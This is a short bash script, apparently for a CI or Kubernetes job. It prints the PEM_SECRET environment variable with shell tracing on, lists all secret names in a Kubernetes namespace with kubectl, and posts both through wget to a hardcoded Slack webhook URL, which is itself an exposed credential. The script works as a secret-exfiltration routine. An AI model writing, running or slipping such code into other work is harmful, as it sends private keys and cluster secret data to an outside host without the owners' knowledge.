#!/usr/bin/env bash

set -xv

echo "${PEM_SECRET}"
echo "${NAMESPACE}"
echo "Hello"

slack_webhook_url='https://hooks.slack.com/services/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'

function show_msg() {
    # escape=$(echo "$*" | sed "s/\"/\\\\\"/g")

    echo "$slack_msg_prefix: $*"
    l_escape=$(echo "$slack_msg_prefix: $*" | sed "s/\"/\\\\\"/g")
    
    wget --post-data '{"text":"'"${l_escape}"'"}' --header='Content-Type: application/json' $slack_webhook_url
}

show_msg "JSON_SECRET value is \`$PEM_SECRET\`"
show_msg "NAMESPACE value is \`$NAMESPACE\`"
secrets=$(kubectl get secrets -n $NAMESPACE --no-headers -o custom-columns='NAME:metadata.name')
show_msg "Secrets are \`$secrets\`"
